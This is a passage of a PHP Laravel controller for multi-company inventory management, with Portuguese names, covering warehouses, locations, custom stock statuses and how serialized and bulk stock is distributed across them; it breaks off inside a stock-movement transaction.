<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Deposito;
use App\Models\Estoque;
use App\Models\CategoriaProduto;
use App\Utils\EstoqueUtil;
use App\Models\RetiradaEstoque;
use App\Models\ProdutoLocalizacao;
use App\Models\Localizacao;
use App\Models\ProdutoUnico;
use App\Models\EstoqueStatusSaldo;
use App\Models\EstoqueStatusCadastro;
use App\Models\ConfigGeral;
use App\Services\EstoqueStatusService;
use App\Utils\QuantidadeUtil;
use App\Utils\StatusKeyUtil;
use App\Utils\VariacaoQueryUtil;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;

class EstoqueController extends Controller
{
    protected $util;
    protected $estoqueStatusService;

    public function __construct(EstoqueUtil $util, EstoqueStatusService $estoqueStatusService)
    {
        $this->util = $util;
        $this->estoqueStatusService = $estoqueStatusService;
        $this->middleware('permission:estoque_create', ['only' => ['create', 'store']]);
        $this->middleware('permission:estoque_edit', ['only' => ['edit', 'update']]);
        $this->middleware('permission:estoque_view', ['only' => ['show', 'index']]);
        $this->middleware('permission:estoque_delete', ['only' => ['destroy']]);
        $this->middleware('permission:estoque_edit', ['only' => ['storeDeposito', 'destroyDeposito', 'storeStatus', 'destroyStatus']]);
        $this->middleware('permission:estoque_view', ['only' => ['distribuicao']]);
        $this->middleware('permission:estoque_view', ['only' => ['distribuicaoSeriais']]);
        $this->middleware('permission:estoque_edit', ['only' => ['distribuicaoMovimentar']]);
    }

    private function getEmpresaIdAtual(Request $request)
    {
        if ($request->empresa_id) {
            return (int)$request->empresa_id;
        }

        if (Auth::check() && Auth::user()->empresa) {
            return (int)Auth::user()->empresa->empresa_id;
        }

        return null;
    }

    private function resolveLocalId($local_id = null, $empresa_id = null)
    {
        if ($local_id) {
            $local = Localizacao::where('id', $local_id)
                ->when($empresa_id, function ($q) use ($empresa_id) {
                    return $q->where('empresa_id', $empresa_id);
                })
                ->first();
            if ($local) {
                return (int)$local->id;
            }

            return null;
        }

        if (function_exists('__getLocalAtivo')) {
            $localAtivo = __getLocalAtivo();
            if ($localAtivo && isset($localAtivo->id)) {
                if (!$empresa_id || (int)$localAtivo->empresa_id === (int)$empresa_id) {
                    $localAtivoValido = Localizacao::where('id', $localAtivo->id)
                        ->when($empresa_id, function ($q) use ($empresa_id) {
                            return $q->where('empresa_id', $empresa_id);
                        })
                        ->first();
                    if ($localAtivoValido) {
                        return (int)$localAtivoValido->id;
                    }
                }
            }
        }

        if ($empresa_id && function_exists('__getLocalPadraoEmpresa')) {
            $localPadrao = __getLocalPadraoEmpresa($empresa_id);
            if ($localPadrao && isset($localPadrao->id)) {
                $localPadraoValido = Localizacao::where('id', $localPadrao->id)
                    ->where('empresa_id', $empresa_id)
                    ->first();
                if ($localPadraoValido) {
                    return (int)$localPadraoValido->id;
                }
            }
        }

        return null;
    }

    private function resolveDepositoContext($deposito_id = null, $local_id = null, $empresa_id = null): ?array
    {
        if ($deposito_id) {
            $deposito = Deposito::where('id', $deposito_id)
                ->when($empresa_id, function ($q) use ($empresa_id) {
                    return $q->where('empresa_id', $empresa_id);
                })
                ->first();

            if (!$deposito) {
                return null;
            }

            if ($local_id && (int)$deposito->local_id !== (int)$local_id) {
                return null;
            }

            return [
                'deposito_id' => (int)$deposito->id,
                'local_id' => (int)$deposito->local_id,
            ];
        }

        $localResolvido = $this->resolveLocalId($local_id, $empresa_id);
        if (!$localResolvido) {
            return null;
        }

        $deposito = Deposito::ensureDefaultForLocalId((int)$localResolvido);
        if (!$deposito) {
            return null;
        }

        if ($empresa_id && (int)$deposito->empresa_id !== (int)$empresa_id) {
            return null;
        }

        return [
            'deposito_id' => (int)$deposito->id,
            'local_id' => (int)$localResolvido,
        ];
    }

    private function applyDepositoFiltro($query, ?int $deposito_id = null, ?int $local_id = null)
    {
        if ($deposito_id) {
            return $query->where(function ($q) use ($deposito_id, $local_id) {
                $q->where('deposito_id', $deposito_id);
                if ($local_id) {
                    $q->orWhere(function ($legacy) use ($local_id) {
                        $legacy->whereNull('deposito_id')
                            ->where('local_id', $local_id);
                    });
                }
            });
        }

        if ($local_id) {
            return $query->where('local_id', $local_id);
        }

        return $query->whereNull('deposito_id')->whereNull('local_id');
    }

    private function parseDistribuicaoBucket(string $bucket): array
    {
        [$depositoId, $localId] = array_pad(explode(':', $bucket, 2), 2, 'null');

        return [
            'deposito_id' => $depositoId !== 'null' ? (int)$depositoId : null,
            'local_id' => $localId !== 'null' ? (int)$localId : null,
        ];
    }

    private function buildDistribuicaoBucketKey(?int $deposito_id, ?int $local_id): string
    {
        return ($deposito_id !== null ? (string)$deposito_id : 'null') . ':' . ($local_id !== null ? (string)$local_id : 'null');
    }

    private function findEstoqueByContext(int $produto_id, $produto_variacao_id, ?int $deposito_id = null, ?int $local_id = null)
    {
        $query = Estoque::where('produto_id', $produto_id);
        $query = $this->applyDepositoFiltro($query, $deposito_id, $local_id);
        $query = VariacaoQueryUtil::apply($query, $produto_variacao_id);

        return $query->orderByDesc('deposito_id')->orderByDesc('id');
    }

    private function findProdutoUnicoByContext(int $produto_id, ?int $deposito_id = null, ?int $local_id = null)
    {
        $query = ProdutoUnico::where('produto_id', $produto_id)
            ->where('tipo', 'entrada')
            ->where('em_estoque', 1);

        if ($deposito_id || $local_id) {
            $query = $this->applyDepositoFiltro($query, $deposito_id, $local_id);
        }

        return $query;
    }

    private function movementTypeByDeltaUnits(int $deltaUnits): string
    {
        return $deltaUnits < 0 ? 'reducao' : 'incremento';
    }

    private function movementQuantityByDeltaUnits(int $deltaUnits)
    {
        return QuantidadeUtil::fromUnits(abs($deltaUnits));
    }

    private function ensureProdutoLocalizacao(int $produto_id, int $local_id): void
    {
        ProdutoLocalizacao::updateOrCreate([
            'produto_id' => $produto_id,
            'localizacao_id' => $local_id,
        ]);
    }

    private function statusBaseOptions(): array
    {
        return [
            StatusKeyUtil::DEFAULT_STATUS,
            'ASSISTENCIA',
            'DEFEITO',
            'EMPRESTADO',
        ];
    }

    private function ensureStatusBaseEmpresa(int $empresa_id): void
    {
        foreach ($this->statusBaseOptions() as $statusBase) {
            $status = $this->normalizaStatusKey($statusBase, true);
            $row = EstoqueStatusCadastro::firstOrCreate(
                [
                    'empresa_id' => $empresa_id,
                    'status_key' => $status,
                ],
                [
                    'descricao' => $status,
                    'is_system' => true,
                    'ativo' => true
                ]
            );

            if (!(bool)$row->is_system || !(bool)$row->ativo) {
                $row->is_system = true;
                $row->ativo = true;
                $row->save();
            }
        }
    }

    private function statusCatalogEmpresa(int $empresa_id)
    {
        $this->ensureStatusBaseEmpresa($empresa_id);

        return EstoqueStatusCadastro::where('empresa_id', $empresa_id)
            ->where('ativo', 1)
            ->orderByRaw(
                "CASE
                    WHEN status_key = 'ATIVO' THEN 0
                    WHEN status_key = 'ASSISTENCIA' THEN 1
                    WHEN status_key = 'DEFEITO' THEN 2
                    WHEN status_key = 'EMPRESTADO' THEN 3
                    ELSE 4
                END"
            )
            ->orderBy('descricao')
            ->get();
    }

    private function formatStatusLabel(string $status): string
    {
        return str_replace('_', ' ', $status);
    }

    private function normalizaStatusKey(?string $status, bool $required = false): ?string
    {
        $normalizado = StatusKeyUtil::normalize($status);
        if ($normalizado === null || !StatusKeyUtil::isValid($normalizado)) {
            if ($required) {
                throw new \Exception('Status inválido. Use apenas letras, números e underscore.');
            }
            return null;
        }
        return $normalizado;
    }

    private function resolveLocalPadraoIdEmpresa(int $empresa_id): ?int
    {
        if (function_exists('__getLocalPadraoEmpresa')) {
            $localPadrao = __getLocalPadraoEmpresa($empresa_id);
            if ($localPadrao && isset($localPadrao->id)) {
                $localValido = Localizacao::where('id', $localPadrao->id)
                    ->where('empresa_id', $empresa_id)
                    ->first();
                if ($localValido) {
                    return (int)$localValido->id;
                }
            }
        }

        $localAtivo = Localizacao::where('empresa_id', $empresa_id)
            ->where('status', 1)
            ->orderBy('id')
            ->first();

        return $localAtivo ? (int)$localAtivo->id : null;
    }

    private function locaisPermitidosIds(int $empresa_id): array
    {
        $ids = collect();
        if (function_exists('__getLocaisAtivoUsuario')) {
            $locaisUsuario = __getLocaisAtivoUsuario();
            if ($locaisUsuario) {
                $ids = collect($locaisUsuario)
                    ->filter(function ($local) use ($empresa_id) {
                        return isset($local->id) && (int)$local->empresa_id === $empresa_id;
                    })
                    ->pluck('id');
            }
        }

        if ($ids->isEmpty()) {
            $ids = Localizacao::where('empresa_id', $empresa_id)
                ->where('status', 1)
                ->pluck('id');
        }

        return $ids
            ->map(function ($id) {
                return (int)$id;
            })
            ->filter()
            ->unique()
            ->values()
            ->all();
    }

    private function locaisDisponiveisParaOperacao(int $empresa_id, array $extraIds = [])
    {
        $ids = collect($this->locaisPermitidosIds($empresa_id))
            ->merge($extraIds)
            ->map(function ($id) {
                return (int)$id;
            })
            ->filter()
            ->unique()
            ->values();

        if ($ids->isEmpty()) {
            return collect();
        }

        return Localizacao::where('empresa_id', $empresa_id)
            ->whereIn('id', $ids->all())
            ->orderBy('descricao')
            ->get();
    }

    private function statusOptions(array $statuses = [], ?int $empresa_id = null): array
    {
        $catalogRows = collect();
        if ($empresa_id) {
            $catalogRows = $this->statusCatalogEmpresa($empresa_id);
        }
        $catalogMap = $catalogRows->pluck('descricao', 'status_key');

        $allStatuses = collect($this->statusBaseOptions())
            ->merge($catalogMap->keys()->all())
            ->merge($statuses)
            ->map(function ($status) {
                return $this->normalizaStatusKey($status);
            })
            ->filter()
            ->unique()
            ->values();

        return $allStatuses
            ->map(function ($status) use ($catalogMap) {
                return [
                    'value' => $status,
                    'label' => $catalogMap[$status] ?? $this->formatStatusLabel($status),
                ];
            })
            ->values()
            ->all();
    }

    private function statusOperacionalOptions(int $empresa_id): array
    {
        $options = ['TODOS' => 'Todos'];
        foreach ($this->statusOptions([], $empresa_id) as $status) {
            if ($status['value'] === 'ATIVO') {
                $options[$status['value']] = 'Disponíveis para venda (ATIVO)';
            } else {
                $options[$status['value']] = $status['label'];
            }
        }
        return $options;
    }

    private function statusGerenciaveis(int $empresa_id): array
    {
        $rows = $this->statusCatalogEmpresa($empresa_id);

        $statusEmUsoSaldos = EstoqueStatusSaldo::where('empresa_id', $empresa_id)
            ->whereNotNull('status_key')
            ->pluck('status_key')
            ->map(function ($status) {
                return StatusKeyUtil::normalize($status);
            })
            ->filter()
            ->unique()
            ->values()
            ->all();

        $statusEmUsoSeriais = DB::table('produto_unicos')
            ->join('produtos', 'produtos.id', '=', 'produto_unicos.produto_id')
            ->where('produtos.empresa_id', $empresa_id)
            ->whereNotNull('produto_unicos.status_key')
            ->pluck('produto_unicos.status_key')
            ->map(function ($status) {
                return StatusKeyUtil::normalize($status);
            })
            ->filter()
            ->unique()
            ->values()
            ->all();

        $statusEmUso = collect($statusEmUsoSaldos)
            ->merge($statusEmUsoSeriais)
            ->unique()
            ->values()
            ->all();

        return $rows->map(function ($row) use ($statusEmUso) {
            $statusKey = $this->normalizaStatusKey($row->status_key) ?? '';
            $isBase = in_array($statusKey, $this->statusBaseOptions(), true);
            $inUse = in_array($statusKey, $statusEmUso, true);
            return [
                'id' => (int)$row->id,
                'status_key' => $statusKey,
                'label' => $row->descricao ?: $this->formatStatusLabel($statusKey),
                'is_system' => (bool)$row->is_system || $isBase,
                'in_use' => $inUse,
                'can_delete' => !((bool)$row->is_system || $isBase || $inUse),
            ];
        })->values()->all();
    }

    private function depositoGerenciaveis(int $empresa_id): array
    {
        $locaisPermitidos = $this->locaisPermitidosIds($empresa_id);

        $depositos = Deposito::with('localizacao:id,descricao')
            ->where('empresa_id', $empresa_id)
            ->when(!empty($locaisPermitidos), function ($query) use ($locaisPermitidos) {
                return $query->whereIn('local_id', $locaisPermitidos);
            })
            ->orderBy('local_id')
            ->orderByDesc('padrao')
            ->orderBy('nome')
            ->get();

        return $depositos->map(function ($deposito) {
            $inUse = Estoque::where('deposito_id', $deposito->id)->exists()
                || ProdutoUnico::where('deposito_id', $deposito->id)->exists()
                || EstoqueStatusSaldo::where('deposito_id', $deposito->id)->exists();

            return [
                'id' => (int)$deposito->id,
                'nome' => $deposito->nome,
                'descricao' => $deposito->descricao,
                'localizacao' => optional($deposito->localizacao)->descricao,
                'ativo' => (bool)$deposito->ativo,
                'is_system' => (bool)$deposito->padrao,
                'in_use' => $inUse,
                'can_delete' => !(bool)$deposito->padrao && !$inUse,
            ];
        })->values()->all();
    }

    public function storeStatus(Request $request)
    {
        $empresa_id = $this->getEmpresaIdAtual($request);
        if (!$empresa_id) {
            session()->flash('flash_error', 'Empresa ativa não identificada.');
            return redirect()->route('estoque.index');
        }

        $request->validate([
            'nome_status' => 'required|string|max:80',
        ], [
            'nome_status.required' => 'Informe o nome do status.',
        ]);

        $statusKey = $this->normalizaStatusKey($request->nome_status, true);
        if (!$statusKey || strlen($statusKey) > StatusKeyUtil::MAX_LENGTH) {
            session()->flash('flash_error', 'Status inválido.');
            return redirect()->route('estoque.index');
        }

        $this->ensureStatusBaseEmpresa($empresa_id);

        $exists = EstoqueStatusCadastro::where('empresa_id', $empresa_id)
            ->where('status_key', $statusKey)
            ->exists();
        if ($exists) {
            session()->flash('flash_warning', 'Já existe um status com esse nome.');
            return redirect()->route('estoque.index');
        }

        EstoqueStatusCadastro::create([
            'empresa_id' => $empresa_id,
            'status_key' => $statusKey,
            'descricao' => $statusKey,
            'is_system' => false,
            'ativo' => true,
        ]);

        session()->flash('flash_success', 'Status cadastrado com sucesso!');
        return redirect()->route('estoque.index');
    }

    public function destroyStatus($id)
    {
        $empresa_id = $this->getEmpresaIdAtual(request());
        if (!$empresa_id) {
            session()->flash('flash_error', 'Empresa ativa não identificada.');
            return redirect()->route('estoque.index');
        }
        $row = EstoqueStatusCadastro::where('id', $id)
            ->where('empresa_id', $empresa_id)
            ->firstOrFail();

        $statusKey = $this->normalizaStatusKey($row->status_key, true);
        $isBase = in_array($statusKey, $this->statusBaseOptions(), true);
        if ($isBase || (bool)$row->is_system) {
            session()->flash('flash_warning', 'Status base do sistema não pode ser excluído.');
            return redirect()->route('estoque.index');
        }

        $inUseSaldo = EstoqueStatusSaldo::where('empresa_id', $empresa_id)
            ->where('status_key', $statusKey)
            ->exists();
        $inUseSerial = DB::table('produto_unicos')
            ->join('produtos', 'produtos.id', '=', 'produto_unicos.produto_id')
            ->where('produtos.empresa_id', $empresa_id)
            ->where('produto_unicos.status_key', $statusKey)
            ->exists();
        if ($inUseSaldo || $inUseSerial) {
            session()->flash('flash_warning', 'Status em uso não pode ser excluído.');
            return redirect()->route('estoque.index');
        }

        $row->delete();
        session()->flash('flash_success', 'Status removido com sucesso!');
        return redirect()->route('estoque.index');
    }

    private function somaNaoAtivosPorLocal(int $empresa_id, int $produto_id, $produto_variacao_id, int $local_id, ?int $deposito_id = null): int
    {
        return $this->estoqueStatusService->somaReservasNaoAtivoDepositoUnits(
            $empresa_id,
            $produto_id,
            $produto_variacao_id,
            $deposito_id,
            $local_id
        );
    }

    private function saldoFisicoPorLocal(int $produto_id, $produto_variacao_id, int $local_id, ?int $deposito_id = null): int
    {
        return $this->estoqueStatusService->saldoFisicoDepositoUnits($produto_id, $produto_variacao_id, $deposito_id, $local_id);
    }

    private function saldoStatusNaoSerial(
        int $empresa_id,
        int $produto_id,
        $produto_variacao_id,
        int $local_id,
        ?int $deposito_id,
        string $status_key
    ): int {
        $status = $this->normalizaStatusKey($status_key, true);
        if ($status === StatusKeyUtil::DEFAULT_STATUS) {
            return $this->estoqueStatusService->ativoDisponivelDepositoUnits($empresa_id, $produto_id, $produto_variacao_id, $deposito_id, $local_id);
        }

        $query = EstoqueStatusSaldo::where('empresa_id', $empresa_id)
            ->where('produto_id', $produto_id)
            ->where('status_key', $status);
        $query = $this->applyDepositoFiltro($query, $deposito_id, $local_id);
        $query = VariacaoQueryUtil::apply($query, $produto_variacao_id);
        return QuantidadeUtil::toUnits($query->sum('quantidade'));
    }

    private function ajustarSaldoNaoAtivo(
        int $empresa_id,
        int $produto_id,
        $produto_variacao_id,
        int $local_id,
        ?int $deposito_id,
        string $status_key,
        int $deltaUnits
    ): void {
        $status = $this->normalizaStatusKey($status_key, true);
        if ($status === StatusKeyUtil::DEFAULT_STATUS || $deltaUnits === 0) {
            return;
        }

        $query = EstoqueStatusSaldo::where('empresa_id', $empresa_id)
            ->where('produto_id', $produto_id)
            ->where('status_key', $status);
        $query = $this->applyDepositoFiltro($query, $deposito_id, $local_id);
        $query = VariacaoQueryUtil::apply($query, $produto_variacao_id);
        $registro = $query->lockForUpdate()->first();

        $atualUnits = $registro ? QuantidadeUtil::toUnits($registro->quantidade) : 0;
        $novoUnits = $atualUnits + $deltaUnits;
        if ($novoUnits < 0) {
            throw new \Exception("Saldo insuficiente no status {$status}.");
        }

        if ($novoUnits === 0) {
            if ($registro) {
                $registro->delete();
            }
            return;
        }

        if (!$registro) {
            $registro = new EstoqueStatusSaldo();
            $registro->empresa_id = $empresa_id;
            $registro->produto_id = $produto_id;
            $registro->produto_variacao_id = $produto_variacao_id ?: null;
            $registro->local_id = $local_id;
            $registro->deposito_id = $deposito_id;
            $registro->status_key = $status;
        }
        $registro->quantidade = QuantidadeUtil::fromUnits($novoUnits);
        $registro->local_id = $local_id;
        $registro->deposito_id = $deposito_id;
        $registro->save();
    }

    private function buildDistribuicaoSerial(Estoque $item): array
    {
        $empresa_id = (int)$item->produto->empresa_id;

        $seriais = ProdutoUnico::where('produto_id', $item->produto_id)
            ->where('tipo', 'entrada')
            ->where('em_estoque', 1)
            ->orderBy('codigo')
            ->get(['id', 'codigo', 'local_id', 'deposito_id', 'status_key']);

        $statusesEncontrados = [];
        $localIds = [];
        $counts = [];

        foreach ($seriais as $serial) {
            $status = $this->normalizaStatusKey($serial->status_key) ?? StatusKeyUtil::DEFAULT_STATUS;
            $statusesEncontrados[] = $status;
            $depositoId = $serial->deposito_id ? (int)$serial->deposito_id : null;
            $localId = $serial->local_id ? (int)$serial->local_id : null;
            if ($localId) {
                $localIds[] = $localId;
            }

            $bucket = $this->buildDistribuicaoBucketKey($depositoId, $localId);
            if (!isset($counts[$bucket])) {
                $counts[$bucket] = [];
            }
            if (!isset($counts[$bucket][$status])) {
                $counts[$bucket][$status] = 0;
            }
            $counts[$bucket][$status]++;
        }

        $localIds = collect($localIds)->unique()->values();
        $locais = $this->locaisDisponiveisParaOperacao($empresa_id, $localIds->all())->keyBy('id');
        $statusOptions = $this->statusOptions($statusesEncontrados, $empresa_id);
        $statusValues = collect($statusOptions)->pluck('value')->all();

        $linhas = [];
        foreach ($counts as $bucket => $qtdPorStatus) {
            $contexto = $this->parseDistribuicaoBucket($bucket);
            $depositoId = $contexto['deposito_id'];
            $localId = $contexto['local_id'];
            $localNome = $localId ? ($locais[$localId]->descricao ?? "Local #{$localId}") : '-- Sem local';

            $statusRows = [];
            $totalLocal = 0;
            foreach ($statusValues as $statusValue) {
                $quantidade = (int)($qtdPorStatus[$statusValue] ?? 0);
                $statusRows[] = [
                    'status' => $statusValue,
                    'label' => $this->formatStatusLabel($statusValue),
                    'quantidade' => $quantidade,
                ];
                $totalLocal += $quantidade;
            }

            $linhas[] = [
                'deposito_id' => $depositoId,
                'local_id' => $localId,
                'local_nome' => $localNome,
                'total_local' => $totalLocal,
                'statuses' => $statusRows,
            ];
        }

        usort($linhas, function ($a, $b) {
            return strcmp((string)$a['local_nome'], (string)$b['local_nome']);
        });

        $seriaisPayload = $seriais
            ->map(function ($serial) use ($locais) {
                $status = $this->normalizaStatusKey($serial->status_key) ?? StatusKeyUtil::DEFAULT_STATUS;
                $depositoId = $serial->deposito_id ? (int)$serial->deposito_id : null;
                $localId = $serial->local_id ? (int)$serial->local_id : null;

                return [
                    'produto_unico_id' => (int)$serial->id,
                    'codigo' => $serial->codigo,
                    'deposito_id' => $depositoId,
                    'local_id' => $localId,
                    'local_nome' => $localId ? ($locais[$localId]->descricao ?? "Local #{$localId}") : '--',
                    'status' => $status,
                    'status_label' => $this->formatStatusLabel($status),
                ];
            })
            ->values()
            ->all();

        return [
            'linhas' => $linhas,
            'seriais' => $seriaisPayload,
            'locais_utilizados' => $localIds->all(),
            'status_options' => $statusOptions,
        ];
    }

    private function buildDistribuicaoNaoSerial(Estoque $item): array
    {
        $empresa_id = (int)$item->produto->empresa_id;
        $produto_variacao_id = $item->produto_variacao_id ?: null;

        $estoquesProdutoQuery = Estoque::where('produto_id', $item->produto_id);
        $estoquesProdutoQuery = VariacaoQueryUtil::apply($estoquesProdutoQuery, $produto_variacao_id);
        $estoquesProduto = $estoquesProdutoQuery->get(['local_id', 'deposito_id', 'quantidade']);

        $statusRowsQuery = EstoqueStatusSaldo::where('empresa_id', $empresa_id)
            ->where('produto_id', $item->produto_id);
        $statusRowsQuery = VariacaoQueryUtil::apply($statusRowsQuery, $produto_variacao_id);
        $statusRows = $statusRowsQuery
            ->where('quantidade', '>', 0)
            ->get(['local_id', 'deposito_id', 'status_key', 'quantidade']);

        $localIds = $estoquesProduto->pluck('local_id')
            ->merge($statusRows->pluck('local_id'))
            ->filter()
            ->map(function ($id) {
                return (int)$id;
            })
            ->unique()
            ->values();

        $locais = $this->locaisDisponiveisParaOperacao($empresa_id, $localIds->all())->keyBy('id');
        $statusOptions = $this->statusOptions($statusRows->pluck('status_key')->all(), $empresa_id);
        $statusValues = collect($statusOptions)->pluck('value')->all();

        $linhas = [];
        $buckets = collect();
        foreach ($estoquesProduto as $row) {
            $buckets->push($this->buildDistribuicaoBucketKey(
                $row->deposito_id !== null ? (int)$row->deposito_id : null,
                $row->local_id !== null ? (int)$row->local_id : null
            ));
        }
        foreach ($statusRows as $row) {
            $buckets->push($this->buildDistribuicaoBucketKey(
                $row->deposito_id !== null ? (int)$row->deposito_id : null,
                $row->local_id !== null ? (int)$row->local_id : null
            ));
        }

        foreach ($buckets->filter()->unique()->values() as $bucket) {
            $contexto = $this->parseDistribuicaoBucket($bucket);
            $depositoId = $contexto['deposito_id'];
            $localId = $contexto['local_id'];
            if (!$localId) {
                continue;
            }

            $totalFisico = QuantidadeUtil::toUnits(
                $estoquesProduto
                    ->filter(function ($row) use ($depositoId, $localId) {
                        return (int)$row->local_id === (int)$localId
                            && (($depositoId === null && $row->deposito_id === null) || (int)$row->deposito_id === (int)$depositoId);
                    })
                    ->sum('quantidade')
            );

            $statusQty = [];
            foreach ($statusRows->filter(function ($row) use ($depositoId, $localId) {
                return (int)$row->local_id === (int)$localId
                    && (($depositoId === null && $row->deposito_id === null) || (int)$row->deposito_id === (int)$depositoId);
            }) as $row) {
                $status = $this->normalizaStatusKey($row->status_key);
                if (!$status || $status === StatusKeyUtil::DEFAULT_STATUS) {
                    continue;
                }
                $qtd = QuantidadeUtil::toUnits($row->quantidade);
                $statusQty[$status] = ($statusQty[$status] ?? 0) + $qtd;
            }

            $ativo = $this->saldoStatusNaoSerial(
                $empresa_id,
                (int)$item->produto_id,
                $produto_variacao_id,
                $localId,
                $depositoId,
                StatusKeyUtil::DEFAULT_STATUS
            );

            $statusLocais = [];
            foreach ($statusValues as $statusValue) {
                $qtd = $statusValue === StatusKeyUtil::DEFAULT_STATUS
                    ? $ativo
                    : (int)($statusQty[$statusValue] ?? 0);
                $statusLocais[] = [
                    'status' => $statusValue,
                    'label' => $this->formatStatusLabel($statusValue),
                    'quantidade' => QuantidadeUtil::fromUnits($qtd),
                ];
            }

            $linhas[] = [
                'deposito_id' => $depositoId,
                'local_id' => $localId,
                'local_nome' => $locais[$localId]->descricao ?? "Local #{$localId}",
                'total_local' => QuantidadeUtil::fromUnits($totalFisico),
                'statuses' => $statusLocais,
                'ativo_disponivel' => QuantidadeUtil::fromUnits($ativo),
            ];
        }

        return [
            'linhas' => $linhas,
            'seriais' => [],
            'locais_utilizados' => $localIds->all(),
            'status_options' => $statusOptions,
        ];
    }

    public function distribuicao($id)
    {
        try {
            $item = Estoque::with(['produto', 'produtoVariacao', 'local'])->findOrFail($id);
            if (!$item->produto || (int)$item->produto->empresa_id !== (int)request()->empresa_id) {
                return response()->json(['message' => 'Produto/estoque inválido para a empresa ativa.'], 422);
            }

            $empresa_id = (int)$item->produto->empresa_id;
            $dadosDistribuicao = (bool)$item->produto->tipo_unico
                ? $this->buildDistribuicaoSerial($item)
                : $this->buildDistribuicaoNaoSerial($item);

            $locais = $this->locaisDisponiveisParaOperacao($empresa_id, $dadosDistribuicao['locais_utilizados'])
                ->map(function ($local) {
                    return [
                        'id' => (int)$local->id,
                        'descricao' => $local->descricao,
                    ];
                })
                ->values()
                ->all();

            if (empty($locais)) {
                $localPadraoId = $this->resolveLocalPadraoIdEmpresa($empresa_id);
                if ($localPadraoId) {
                    $localPadrao = Localizacao::where('id', $localPadraoId)
                        ->where('empresa_id', $empresa_id)
                        ->first();
                    if ($localPadrao) {
                        $locais[] = [
                            'id' => (int)$localPadrao->id,
                            'descricao' => $localPadrao->descricao,
                        ];
                    }
                }
            }

            return response()->json([
                'item' => [
                    'estoque_id' => (int)$item->id,
                    'produto_id' => (int)$item->produto_id,
                    'produto_nome' => $item->descricao(),
                    'produto_variacao_id' => $item->produto_variacao_id ? (int)$item->produto_variacao_id : null,
                    'tipo_unico' => (bool)$item->produto->tipo_unico,
                ],
                'status_options' => $dadosDistribuicao['status_options'],
                'locais' => $locais,
                'distribuicao' => $dadosDistribuicao['linhas'],
                'seriais' => $dadosDistribuicao['seriais'],
            ]);
        } catch (\Exception $e) {
            return response()->json(['message' => $e->getMessage()], 422);
        }
    }

    public function distribuicaoSeriais(Request $request, $id)
    {
        try {
            $item = Estoque::with(['produto'])->findOrFail($id);
            if (!$item->produto || (int)$item->produto->empresa_id !== (int)request()->empresa_id) {
                return response()->json(['message' => 'Produto/estoque inválido para a empresa ativa.'], 422);
            }
            if (!(bool)$item->produto->tipo_unico) {
                return response()->json(['message' => 'A listagem de unidades é válida apenas para produto serializado.'], 422);
            }

            $empresa_id = (int)$item->produto->empresa_id;
            $locaisPermitidos = $this->locaisPermitidosIds($empresa_id);

            $query = $this->findProdutoUnicoByContext((int)$item->produto_id);

            $localFiltro = $request->filled('local_id') ? (int)$request->local_id : null;
            $depositoFiltro = $request->filled('deposito_id') ? (int)$request->deposito_id : null;
            if ($depositoFiltro || $localFiltro) {
                $contextoFiltro = $this->resolveDepositoContext($depositoFiltro, $localFiltro, $empresa_id);
                if (!$contextoFiltro) {
                    return response()->json(['message' => 'Depósito inválido para a empresa ativa.'], 422);
                }

                $query = $this->applyDepositoFiltro($query, $contextoFiltro['deposito_id'], $contextoFiltro['local_id']);
            } else if (!empty($locaisPermitidos)) {
                $query->where(function ($q) use ($locaisPermitidos) {
                    $q->whereIn('local_id', $locaisPermitidos)
                        ->orWhereNull('local_id');
                });
            }

            $perPage = (int)$request->get('per_page', 50);
            $perPage = max(10, min($perPage, 200));

            $paginator = $query
                ->orderBy('codigo')
                ->paginate($perPage);

            $localIds = collect($paginator->items())
                ->pluck('local_id')
                ->filter()
                ->map(function ($id) {
                    return (int)$id;
                })
                ->unique()
                ->values()
                ->all();

            $locais = Localizacao::where('empresa_id', $empresa_id)
                ->whereIn('id', $localIds)
                ->pluck('descricao', 'id');

            $seriais = collect($paginator->items())
                ->map(function ($serial) use ($locais) {
                    $status = $this->normalizaStatusKey($serial->status_key) ?? StatusKeyUtil::DEFAULT_STATUS;
                    $depositoId = $serial->deposito_id ? (int)$serial->deposito_id : null;
                    $localId = $serial->local_id ? (int)$serial->local_id : null;

                    return [
                        'produto_unico_id' => (int)$serial->id,
                        'codigo' => $serial->codigo,
                        'deposito_id' => $depositoId,
                        'local_id' => $localId,
                        'local_nome' => $localId ? ($locais[$localId] ?? "Local #{$localId}") : '-- Sem local',
                        'status' => $status,
                        'status_label' => $this->formatStatusLabel($status),
                    ];
                })
                ->values()
                ->all();

            return response()->json([
                'seriais' => $seriais,
                'meta' => [
                    'current_page' => (int)$paginator->currentPage(),
                    'last_page' => (int)$paginator->lastPage(),
                    'per_page' => (int)$paginator->perPage(),
                    'total' => (int)$paginator->total(),
                ],
            ]);
        } catch (\Exception $e) {
            return response()->json(['message' => $e->getMessage()], 422);
        }
    }

    private function movimentarDistribuicaoSerial(Request $request, Estoque $item, int $empresa_id): void
    {
        $validator = Validator::make($request->all(), [
            'produto_unico_id' => 'required|integer',
            'local_destino_id' => 'nullable|integer',
            'deposito_destino_id' => 'nullable|integer',
            'status_destino' => 'nullable|string|max:60',
            'status_key' => 'nullable|string|max:60',
        ], [
            'produto_unico_id.required' => 'Selecione o código único.',
            'local_destino_id.required' => 'Informe o local de destino.',
        ]);
        $validator->validate();

        $serialId = (int)$request->produto_unico_id;
        $contextoDestino = $this->resolveDepositoContext(
            $request->filled('deposito_destino_id') ? (int)$request->deposito_destino_id : null,
            $request->filled('local_destino_id') ? (int)$request->local_destino_id : null,
            $empresa_id
        );
        if (!$contextoDestino) {
            throw new \Exception('Informe um depósito de entrada válido.');
        }
        $localDestinoId = $contextoDestino['local_id'];
        $depositoDestinoId = $contextoDestino['deposito_id'];
        $statusRaw = $request->status_key ?? $request->status_destino;
        $statusDestino = $this->normalizaStatusKey($statusRaw, true);
        if (strlen($statusDestino) > StatusKeyUtil::MAX_LENGTH) {
            throw new \Exception('Status inválido: tamanho máximo excedido.');
        }

        $locaisPermitidos = $this->locaisPermitidosIds($empresa_id);
        if (!in_array($localDestinoId, $locaisPermitidos, true)) {
            throw new \Exception('Depósito de entrada não permitido para o usuário.');
        }

        $localDestino = Localizacao::where('id', $localDestinoId)
            ->where('empresa_id', $empresa_id)
            ->first();
        if (!$localDestino) {
            throw new \Exception('Depósito de entrada inválido para a empresa ativa.');
        }

        DB::transaction(function () use ($serialId, $item, $localDestinoId, $depositoDestinoId, $statusDestino) {
